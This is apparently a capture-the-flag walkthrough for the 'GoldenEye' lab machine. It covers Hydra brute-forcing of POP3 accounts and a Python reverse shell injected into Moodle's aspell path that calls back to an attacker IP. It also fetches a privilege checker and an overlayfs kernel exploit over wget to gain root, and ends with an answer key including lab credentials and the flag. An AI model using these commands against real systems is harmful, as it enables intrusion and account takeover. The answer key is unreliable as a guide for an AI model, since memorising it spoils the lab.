# GoldenEye - Medium

```shell
rustscan -a 10.10.55.181 --range 0-65535 --ulimit 5000 -- -sV

gobuster dir -u http://10.10.55.181 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak

telnet 10.10.55.181 55007

USER boris

PASS InvincibleHack3r
#this does not work
#we need to find password

hydra -l boris -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.55.181 pop3 -s 55007
#for some reason rockyou.txt did not work for me
#we get creds by using fasttrack wordlist

telnet 10.10.55.181 55007

USER boris

PASS secret1!
#logged in

STAT

LIST
#read all 3 emails

RETR 1

RETR 2

RETR 3

QUIT

hydra -l xenia -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.55.181 pop3 -s 55007
#does not work

hydra -l natalya -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.55.181 pop3 -s 55007
#cracks natalya's pop3 creds

telnet 10.10.55.181 55007

USER natalya

PASS bird
#logged in

LIST

RETR 1

RETR 2

QUIT

sudo vim /etc/hosts
#map machine IP to severnaya-station.com

hydra -l doak -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.55.181 pop3 -s 55007
#we get creds doak:goat

telnet 10.10.55.181 55007

USER doak

PASS goat

LIST

RETR 1

QUIT
#now we have dr_doak's creds

#exploit aspell in moodle
#after entering reverse-shell code, setup listener
nc -nvlp 5555

#after toggling spell-check, we get shell
id
#www-data

#on attacker machine, download linuxprivchecker and start server
python3 -m http.server 1337

#back to our reverse shell
wget http://10.14.31.212:1337/linuxprivchecker.py

python linuxprivchecker.py
#helps in privesc enumeration

which gcc
#no gcc in victim machine

which cc
#available

#in attacker machine, download exploit from exploit-db
#modify gcc occurrences to cc

#in victim machine
wget http://10.14.31.212:1337/overlayfs-cc.c

cc overlayfs-cc.c -o ofs
#generates warnings, ignore

./ofs
#gives root shell

cd /root

ls -la

cat .flag.txt
#root flag
```

```markdown
Open ports & services:

  * 25 - smtp - Postfix smtpd
  * 80 - http - Apache httpd 2.4.7 (Ubuntu)
  * 55006 - ssl/pop3 - Dovecot pop3d
  * 55007 - pop3 - Dovecot pop3d

We can explore the website while Gobuster will enumerate for directories in the background.

The webpage is for 'Severnaya Auxiliary Control Station', and for login we need to navigate to /sev-home/

Checking the source code using Inspect option, we can view the JS script used in this, named terminal.js

This script contains a message for Boris, to update the default password; an encoded password has also been given:

    &#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

This can be cracked using CyberChef, from HTML entity, to give the string "InvincibleHack3r".

Now we can try the credentials boris:InvincibleHack3r in /sev-home/, and we get access to info about the GoldenEye project.

In /sev-home/, we are instructed to email a qualified GNO supervisor; and the source code of the same page includes a comment which lists two names - Natalya and Boris - as qualified GNO supervisors.

We can check other services on this machine, such as smtp and pop3; we can also email one of the supervisors in this process.

Attempting to login as boris by reusing the same creds does not work.

We can attempt to brute-force the pop3 service on port 55007, we will do so with boris as user.

Using hydra, we get the creds boris:secret1! for pop3; we can check the mails now using Telnet.

By reading the emails, we get a lot of intel; we can login as Xenia.

Now, we can check other services and try to brute-force our way into it; we have 3 users - boris, natalya and xenia.

Eventually, we get the creds natalya:bird for pop3, and we can login to check for any clues.

By logging in as natalya, we get more intel - GoldenEye is being sought after by 'Janus'.

In another email, we get the creds xenia:RCP90rulez! for the internal domain severnaya-station.com

So, we would need to add this domain to our /etc/hosts before proceeding.

Then, we need to navigate to <http://severnaya-station.com/gnocertdir>; here we can login as xenia using the creds we found earlier.

We have one unread message - it is from the user 'doak'; as the message specifies email, we can try bruteforcing pop3 login using Hydra for user doak.

Brute-force works using Hydra and we get the creds doak:goat for pop3.

From doak's login, we get one email with creds for logging into the training site; the creds are dr_doak:4England!

We can enumerate the account on /gnocertdir, and check for any files or messages containing clues.

In the private files section, we get a file called s3cret.txt; this reveals info about admin creds, and we are given a location - /dir007key/for-007.jpg

On navigating to that directory, we get an image file; we can use stego to uncover any secrets this image might hold.

Using exiftool, we get a base64 string, which decodes to "xWinter1995x!"

This can be used as admin creds for the account login at /gnocertdir

Now we have to find a way to get reverse-shell; from the given hints, we have to get reverse-shell using python & netcat.

We need to add our reverse-shell code to Aspell (which can be found in Settings), followed by which we need to create a new page and 'spell check' it. More info can be found by searching for CVE-2021-21809

We need to access /gnocertdir/admin/settings.php?section=systempaths

Under the 'path to aspell' field, we can add reverse-shell code:

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.31.212",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

After this, we need to set our spell engine to PSpellShell, we can do so in settings for text editors (TinyMCE HTML editor)

Then, all we need to do is add a new blog entry, and toggle the spell-checker on; this gives us a reverse-shell.

We get shell as www-data; as instructed, we download and transfer linuxprivchecker to enumerate the machine.

Once we run the Python script, we get a lot of info regarding privesc.

Searching for "linux 3.13.0-32-generic exploit" leads us to the overlayfs exploit, which can be downloaded from ExploitDB.

Now this exploit is dependent on gcc compiler, but since we do not have that, we will use cc compiler instead.

After compiling and executing the C program, we get root shell.

Root flag can be found at /root/.flag.txt
```

1. How many ports are open? - 4

2. Who needs to make sure they update their default password? - Boris

3. What's their password? - InvincibleHack3r

4. What's their new password? - secret1!

5. Inspect port 55007, what services is configured to use this port? - telnet

6. What can you find on this service? - emails

7. What user can break Boris' codes? - Natalya

8. Which user can you login as? - Xenia

9. What other user can you find? - doak

10. What was this user's password? - goat

11. What is the next user you can find from doak? - dr_doak

12. What is this user's password? - 4England!

13. What is the kernel version? - 3.13.0-32-generic

14. What is the root flag? - 568628e0d993b1973adc718237da6e93
